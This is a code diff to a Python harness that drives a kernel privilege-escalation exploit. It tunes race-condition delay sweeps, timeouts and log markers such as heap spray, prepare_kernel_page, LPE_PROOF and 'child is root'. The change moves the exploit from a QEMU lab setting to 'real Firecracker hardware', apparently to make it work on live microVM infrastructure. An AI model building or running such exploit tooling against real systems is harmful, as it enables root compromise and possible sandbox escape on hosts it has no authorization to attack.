@@ -69,12 +69,14 @@ ALLOW_ROOT = os.environ.get("GLK_ALLOW_ROOT", "0") == "1"
 TMO = float(os.environ.get("GLK_TMO", "720"))
 # Per-run budget (seconds) for one exploit execution.
 RUN_TMO = float(os.environ.get("GLK_RUN_TMO", "240"))
-# Delay rotation list, microseconds. Ordered by lab plausibility first, then
-# widening: real hardware timing is unknown, and a clean miss is cheap.
+# Delay rotation list, microseconds. 460 first (the value validated in the
+# QEMU lab), then a hypothesis-driven sweep: real Firecracker hardware runs
+# the same code ~15-30x faster than TCG, so the equivalent race window is
+# likely much smaller.  A clean miss per delay costs only tens of seconds.
 DELAYS = [int(x) for x in
            os.environ.get("GLK_DELAYS",
-                          "460,450,455,465,470,440,480,420,500,400,550,"
-                          "350,600,300,700,250,800,200,150,100,1000,1200")
+                          "460,50,30,20,15,10,7,5,3,2,1,100,75,40,25,12,8,6,"
+                          "4,450,455,465,470,150,200")
            .split(",") if x.strip()]
 # Recon blob caps (bytes, raw before xz).
 CAP_TEXT = 128 * 1024
@@ -374,9 +376,12 @@ def gates(rep):
 # ---------------------------------------------------------------------------
 
 KEY_LINE = re.compile(
-    r"(W0:|W1:|W2:|route done|route_done|PI route|LPE_PROOF|child uid|"
-    r"child is root|prepare_kernel_page|heap spray done|startup context|"
-    r"Internal error|Oops:|BUG:|SELinux|reboot:|profile)")
+    r"(W0:|W1:|W2:|W3:|route|route_done|PI route|pselect|pre-select|post-select|"
+    r"consumer|waiter|owner|spray|collisions|compact|scratch|VR\.ko|LPE_PROOF|"
+    r"child|prepare_kernel_page|heap spray|startup|profile|context|enforce|"
+    r"selinux|SELinux|seccomp|skipping W|Internal error|Oops:|BUG:|reboot:|"
+    r"kernel page|p0 |perf task|perf_event|uid|futex|layout|page=|slide|"
+    r"epoch|ready|parked)")
 
 
 def patch_delay(profile_bytes, delay_us):
@@ -487,6 +492,7 @@ def run_one(binary, profile_b64, delay_us, budget):
         """Lazily drain the child's output file (file reads never wake the
         writer, so the race is not perturbed)."""
         off = 0
+        last_sent = None
         while not stop.is_set():
             fresh = []
             try:
@@ -504,9 +510,15 @@ def run_one(binary, profile_b64, delay_us, budget):
                             out_lines.append(line)
                             if len(out_lines) > 4000:
                                 del out_lines[:2000]
+                        # Suppress consecutive repeated progress lines
+                        # (e.g. "still finding collisions (Ns)" spam).
                         if KEY_LINE.search(line):
+                            key = re.sub(r"[0-9]+", "#", line)[:160]
+                            if key == last_sent:
+                                continue
+                            last_sent = key
                             rec["markers"] += 1
-                            if rec["markers"] <= 240:
+                            if rec["markers"] <= 1200:
                                 OUT.auto(json.dumps({"ev": "prog",
                                                      "d": delay_us,
                                                      "t": round(
